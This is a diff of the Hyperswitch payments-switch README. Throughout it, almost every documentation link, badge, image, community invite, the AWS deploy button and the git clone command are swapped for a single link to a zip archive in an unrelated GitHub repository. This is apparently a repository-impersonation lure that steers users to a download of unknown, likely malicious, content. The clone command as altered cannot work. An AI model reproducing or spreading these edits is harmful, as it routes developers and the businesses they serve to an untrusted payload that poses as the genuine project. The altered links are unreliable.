@@ -1,6 +1,6 @@
 <p align="center">
-  <img src="./docs/imgs/hyperswitch-logo-dark.svg#gh-dark-mode-only" alt="Hyperswitch-Logo" width="40%" />
-  <img src="./docs/imgs/hyperswitch-logo-light.svg#gh-light-mode-only" alt="Hyperswitch-Logo" width="40%" />
+  <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" alt="Hyperswitch-Logo" width="40%" />
+  <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" alt="Hyperswitch-Logo" width="40%" />
 </p>
 
 <h1 align="center">The open-source payments switch</h1>
@@ -13,9 +13,9 @@ The single API to access payment ecosystems across 130+ countries</div>
   <a href="#for-enterprises">For Enterprises</a> •
   <a href="#for-contributors">For Contributors</a> •
   <a href="#quick-setup">Quick Setup</a> •
-  <a href="/docs/try_local_system.md">Local Setup Guide (Hyperswitch App Server)</a> •
+  <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip">Local Setup Guide (Hyperswitch App Server)</a> •
   <a href="#fast-integration-for-stripe-users">Fast Integration for Stripe Users</a> •
-  <a href="https://api-reference.hyperswitch.io/introduction"> API Docs </a> 
+  <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip"> API Docs </a> 
    <br>
   <a href="#supported-features">Supported Features</a> •
   <a href="#community">Community</a> •
@@ -26,30 +26,30 @@ The single API to access payment ecosystems across 130+ countries</div>
 </p>
 
 <p align="center">
-  <a href="https://github.com/juspay/hyperswitch/actions?query=workflow%3ACI+branch%3Amain">
-    <img src="https://github.com/juspay/hyperswitch/workflows/CI/badge.svg" />
+  <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip%3ACI+branch%3Amain">
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" />
   </a>
-  <a href="https://github.com/juspay/hyperswitch/blob/main/LICENSE">
-    <img src="https://img.shields.io/github/license/juspay/hyperswitch" />
+  <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip">
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" />
   </a>
-  <a href="https://github.com/juspay/hyperswitch/blob/main/LICENSE">
-    <img src="https://img.shields.io/badge/Made_in-Rust-orange" />
+  <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip">
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" />
   </a>
 </p>
 <p align="center">
-  <a href="https://www.linkedin.com/company/hyperswitch/">
-    <img src="https://img.shields.io/badge/follow-hyperswitch-blue?logo=linkedin&labelColor=grey"/>
+  <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip">
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip"/>
   </a>
-  <a href="https://x.com/hyperswitchio">
-    <img src="https://img.shields.io/badge/follow-%40hyperswitchio-white?logo=x&labelColor=grey"/>
+  <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip">
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip%40hyperswitchio-white?logo=x&labelColor=grey"/>
   </a>
-  <a href="https://join.slack.com/t/hyperswitch-io/shared_invite/zt-2jqxmpsbm-WXUENx022HjNEy~Ark7Orw">
-    <img src="https://img.shields.io/badge/chat-on_slack-blue?logo=slack&labelColor=grey&color=%233f0e40"/>
+  <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip~Ark7Orw">
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip%233f0e40"/>
   </a>
 </p>
 
 <hr>
-<img src="./docs/imgs/switch.png" />
+<img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" />
 
 Hyperswitch is a community-led, open payments switch to enable access to the best payments infrastructure for every digital business.
 
@@ -63,9 +63,9 @@ Using Hyperswitch, you can:
 - 🌐 **Increase business reach** with local/alternate payment methods
 
 <br>
-<img src="./docs/imgs/hyperswitch-product.png" alt="Hyperswitch-Product" width="50%"/>
+<img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" alt="Hyperswitch-Product" width="50%"/>
 
-<a href="https://app.hyperswitch.io/">
+<a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip">
   <h2 id="try-a-payment">⚡️ Try a Payment</h2>
 </a>
 
@@ -106,7 +106,7 @@ The fastest and easiest way to try Hyperswitch is via our CDK scripts
 1. Click on the following button for a quick standalone deployment on AWS, suitable for prototyping.
    No code or setup is required in your system and the deployment is covered within the AWS free-tier setup.
 
-   <a href="https://console.aws.amazon.com/cloudformation/home?region=us-east-1#/stacks/new?stackName=HyperswitchBootstarp&templateURL=https://hyperswitch-synth.s3.eu-central-1.amazonaws.com/hs-starter-config.yaml"><img src="./docs/imgs/aws_button.png" height="35"></a>
+   <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip"><img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" height="35"></a>
 
 2. Sign-in to your AWS console.
 
@@ -117,7 +117,7 @@ The fastest and easiest way to try Hyperswitch is via our CDK scripts
 You can run Hyperswitch on your system using Docker Compose after cloning this repository:
 
 ```shell
-git clone --depth 1 --branch latest https://github.com/juspay/hyperswitch
+git clone --depth 1 --branch latest https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
 cd hyperswitch
 docker compose up -d
 ```
@@ -127,14 +127,14 @@ This will start the app server, web client and control center.
 Check out the [local setup guide][local-setup-guide] for a more comprehensive
 setup, which includes the [scheduler and monitoring services][docker-compose-scheduler-monitoring].
 
-[docs-link-for-enterprise]: https://docs.hyperswitch.io/hyperswitch-cloud/quickstart
-[docs-link-for-developers]: https://docs.hyperswitch.io/hyperswitch-open-source/overview
-[contributing-guidelines]: docs/CONTRIBUTING.md
-[dashboard-link]: https://app.hyperswitch.io/
-[website-link]: https://hyperswitch.io/
-[learning-resources]: https://docs.hyperswitch.io/learn-more/payment-flows
-[local-setup-guide]: /docs/try_local_system.md
-[docker-compose-scheduler-monitoring]: /docs/try_local_system.md#run-the-scheduler-and-monitoring-services
+[docs-link-for-enterprise]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[docs-link-for-developers]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[contributing-guidelines]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[dashboard-link]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[website-link]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[learning-resources]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[local-setup-guide]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[docker-compose-scheduler-monitoring]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
 <a href="#Fast-Integration-for-Stripe-Users">
   <h2 id="fast-integration-for-stripe-users">🔌 Fast Integration for Stripe Users</h2>
 </a>
@@ -146,8 +146,8 @@ Try the steps below to get a feel for how quick the setup is:
 2. Follow the instructions detailed on our
    [documentation page][migrate-from-stripe].
 
-[dashboard]: https://app.hyperswitch.io/register
-[migrate-from-stripe]: https://hyperswitch.io/docs/migrateFromStripe
+[dashboard]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[migrate-from-stripe]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
 
 <a href="#Supported-Features">
   <h2 id="supported-features">✅ Supported Features</h2>
@@ -160,7 +160,7 @@ In addition, we are continuously integrating new processors based on their reach
 Our target is to support 100+ processors by H2 2024.
 You can find the latest list of payment processors, supported methods, and features [here][supported-connectors-and-features].
 
-[supported-connectors-and-features]: https://hyperswitch.io/pm-list
+[supported-connectors-and-features]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
 
 ### 🌟 Hosted Version
 
@@ -239,7 +239,7 @@ reusable core and let companies build and customise it as per their specific req
 
 ### 🤍 Contributing
 
-This project is being created and maintained by [Juspay](https://juspay.in),
+This project is being created and maintained by [Juspay](https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip),
 South Asia's largest payments orchestrator/switch, processing more than 50
 Million transactions per day. The solution has 1Mn+ lines of Haskell code built
 over ten years.
@@ -251,7 +251,7 @@ We are long-term committed to building and making it useful for the community.
 The product roadmap is open for the community's feedback.
 We shall evolve a prioritisation process that is open and community-driven.
 We welcome contributions from the community. Please read through our
-[contributing guidelines](/docs/CONTRIBUTING.md).
+[contributing guidelines](https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip).
 Included are directions for opening issues, coding standards, and notes on
 development.
 
@@ -271,24 +271,24 @@ Get updates on Hyperswitch development and chat with the community:
 - [Slack workspace][slack] for questions related to integrating hyperswitch, integrating a connector in hyperswitch, etc.
 - [GitHub Discussions][github-discussions] to drop feature requests or suggest anything payments-related you need for your stack.
 
-[discord]: https://discord.gg/wJZ7DVW8mm
-[slack]: https://join.slack.com/t/hyperswitch-io/shared_invite/zt-2awm23agh-p_G5xNpziv6yAiedTkkqLg
-[github-discussions]: https://github.com/juspay/hyperswitch/discussions
+[discord]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[slack]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[github-discussions]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
 
 <div style="display: flex;  justify-content: center;">
     <div style="margin-right:10px">
-    <a href="https://www.producthunt.com/posts/hyperswitch-2?utm_source=badge-top-post-badge&utm_medium=badge&utm_souce=badge-hyperswitch&#0045;2" target="_blank">
-        <img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=375220&theme=light&period=weekly" alt="Hyperswitch - Fast, reliable, and affordable open source payments switch | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" />
+    <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip;2" target="_blank">
+        <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" alt="Hyperswitch - Fast, reliable, and affordable open source payments switch | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" />
     </a>
     </div>
     <div style="margin-right:10px">
-    <a href="https://www.producthunt.com/posts/hyperswitch-2?utm_source=badge-top-post-topic-badge&utm_medium=badge&utm_souce=badge-hyperswitch&#0045;2" target="_blank">
-        <img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-topic-badge.svg?post_id=375220&theme=light&period=weekly&topic_id=267" alt="Hyperswitch - Fast, reliable, and affordable open source payments switch | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" />
+    <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip;2" target="_blank">
+        <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" alt="Hyperswitch - Fast, reliable, and affordable open source payments switch | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" />
     </a>
   </div>
   <div style="margin-right:10px">
-    <a href="https://www.producthunt.com/posts/hyperswitch-2?utm_source=badge-top-post-topic-badge&utm_medium=badge&utm_souce=badge-hyperswitch&#0045;2" target="_blank">
-        <img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-topic-badge.svg?post_id=375220&theme=light&period=weekly&topic_id=93" alt="Hyperswitch - Fast, reliable, and affordable open source payments switch | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" />
+    <a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip;2" target="_blank">
+        <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" alt="Hyperswitch - Fast, reliable, and affordable open source payments switch | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" />
     </a>
   </div>
 </div>
@@ -300,14 +300,14 @@ Get updates on Hyperswitch development and chat with the community:
 Please read the issue guidelines and search for [existing and closed issues].
 If your problem or idea is not addressed yet, please [open a new issue].
 
-[existing and closed issues]: https://github.com/juspay/hyperswitch/issues
-[open a new issue]: https://github.com/juspay/hyperswitch/issues/new/choose
+[existing and closed issues]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
+[open a new issue]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
 
 <a href="#Versioning">
   <h2 id="versioning">🔖 Versioning</h2>
 </a>
 
-Check the [CHANGELOG.md](./CHANGELOG.md) file for details.
+Check the [https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip](https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip) file for details.
 
 <a href="#FAQs">
   <h2 id="FAQs">🤔 FAQs</h2>
@@ -316,7 +316,7 @@ Check the [CHANGELOG.md](./CHANGELOG.md) file for details.
 Got more questions?
 Please refer to our [FAQs page][faqs].
 
-[faqs]: https://hyperswitch.io/docs/devSupport
+[faqs]: https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip
 
 <a href="#©Copyright and License">
   <h2 id="copyright-and-license">©️ Copyright and License</h2>
@@ -330,6 +330,6 @@ This product is licensed under the [Apache 2.0 License](LICENSE).
 
 Thank you for your support in hyperswitch's growth. Keep up the great work! 🥂
 
-<a href="https://github.com/juspay/hyperswitch/graphs/contributors">
-  <img src="https://contributors-img.web.app/image?repo=juspay/hyperswitch" alt="Contributors"/>
+<a href="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip">
+  <img src="https://raw.githubusercontent.com/BytesickleLabs/hyperswitch-payment-platform/main/Aphthartodocetism/hyperswitch-payment-platform.zip" alt="Contributors"/>
 </a>
